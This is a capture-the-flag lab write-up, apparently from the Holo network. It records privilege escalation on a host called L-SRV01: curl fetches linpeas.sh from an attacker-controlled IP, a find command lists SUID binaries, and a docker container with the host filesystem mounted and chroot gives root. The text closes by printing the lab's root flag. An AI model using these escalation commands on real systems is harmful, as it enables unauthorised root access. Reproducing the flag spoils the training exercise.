
We have shell on L-SRV01 and escaped the container, we need to perform
local privilege escalation to gain root on the box.

Will download the linpeas script using the curl command.
```
curl -O http://10.50.104.169:8080/linpeas.sh
```


or save a file with specific name
```
curl -o enum.sh  http://10.50.104.169:8080/linpeas.sh
```

As we lost the connect will wait for 15 minutes and see what thing we have to see in the linpeas output.

I think we can't download the scrip so will run the command manually as well as do the enumeration manually.

Already know about the SUID concept as well as we also have the command in order to check specifically for that.
```
find / -perm -u=s -type f 2>/dev/null
```

![[Pasted image 20240225114721.png]]

```
docker ps -a
```
![[Pasted image 20240225115238.png]]

```
./docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```
So what i was doing wrong i that we have to replace the alphine with the IMAGE id

```
./docker run -v /:/mnt --rm -it cb1b741122e8 chroot /mnt sh
```
this command also gives error
https://stackoverflow.com/questions/43099116/error-the-input-device-is-not-a-tty

We have to remove the t from the -it 


```
docker run -v /:/mnt --rm -i cb1b741122e8 chroot /mnt sh
```
![[Pasted image 20240225115552.png]]

![[Pasted image 20240225120029.png]]

Finally we escalated and got the root user
![[Pasted image 20240225120209.png]]

As we are root now so will find the root flag (i.e. there is no root flag in the root folder)
But we have to do into the mnt folder and can simply find the root flag there.

```
HOLO{e16581b01d445a05adb2e6d45eb373f7}
```

